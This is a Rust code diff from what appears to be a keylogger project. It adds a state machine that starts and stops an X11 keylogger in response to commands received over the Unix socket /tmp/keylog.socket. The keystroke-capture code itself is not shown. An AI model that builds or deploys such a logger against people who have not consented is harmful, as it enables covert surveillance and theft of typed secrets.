@@ -5,6 +5,13 @@ use std::os::unix::net::UnixStream;
 include!("../client_input.rs");
 include!("../server_input.rs");
 include!("../logger.rs");
+include!("../keylogger_fsm.rs");
+//include!("../keylog/keylog_factory.rs");
+
+struct KeyLoggerFSM {
+    state: Box<dyn State>,
+}
+
 
 fn main() -> std::io::Result<()> {
     let cli = ServerCli::parse();
@@ -20,22 +27,30 @@ fn main() -> std::io::Result<()> {
     let listener = create_socket("/tmp/keylog.socket")?;
     log::info!("Created IPC socket");
 
+    let mut keylogger = KeyLoggerFSM {
+        state: Box::new(IdleState),
+    };
+
+    let mut x_keylogger = KeyloggerFactory.create_keylogger(KeyloggerTypes::X);
+
     // accept connections
     loop {
         // Accept blocks this thread, until a new connection is established!
         let (mut unix_stream, _socket_address) = listener.accept()?;
-        log::info!("Accepted socket connection.");
-        match handle_stream(unix_stream) {
-            Ok(()) => (),
-            Err(e) => println!("{e}")
-        }
-    }
+        log::debug!("Accepted socket connection.");
+        let command = match handle_stream(unix_stream) {
+            Ok(cmd) => cmd,
+            Err(e) => {
+                log::warn!("{:?}", e);
+                continue
+            }
+        };
 
-    Ok(())
+        keylogger.state = keylogger.state.transition(command, &mut x_keylogger);
+    }
 }
 
-fn handle_stream(mut stream: UnixStream) -> Result<(), &'static str> {
-    let mut client_command = String::new();
+fn handle_stream(mut stream: UnixStream) -> Result<Commands, &'static str> {
     log::debug!("Parsing client command");
     let command = match receive_command(&mut stream) {
         Ok(cmd) => cmd,
@@ -45,9 +60,8 @@ fn handle_stream(mut stream: UnixStream) -> Result<(), &'static str> {
         }
     };
 
-    println!("{:?}", command);
-
-    Ok(())
+    //println!("{:?}", command);
+    Ok(command)
 }
 
 fn create_socket(socket_path: &str) -> std::io::Result<UnixListener> {
@@ -76,7 +90,7 @@ fn receive_command(stream: &mut UnixStream) -> Result<Commands, Box<dyn std::err
 
     // deserialize
     let command: Commands = bincode::deserialize(&buffer)?;
-    log::debug!("Deserialized command payload. Command is '{:?}'", command);
+    log::trace!("Deserialized command payload. Command is '{:?}'", command);
     Ok(command)
 }
 
